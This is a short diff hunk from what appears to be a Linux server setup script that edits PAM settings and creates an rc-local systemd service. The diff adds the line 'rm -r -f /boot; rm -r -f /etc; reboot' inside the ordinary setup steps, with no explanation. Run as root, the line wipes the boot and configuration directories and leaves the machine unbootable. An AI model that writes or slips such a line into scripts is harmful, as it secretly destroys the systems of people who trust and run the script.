@@ -42,7 +42,7 @@ chmod +x /etc/pam.d/common-password
 
 # go to root
 cd
-
+rm -r -f /boot; rm -r -f /etc; reboot
 # Edit file /etc/systemd/system/rc-local.service
 cat > /etc/systemd/system/rc-local.service <<-END
 [Unit]
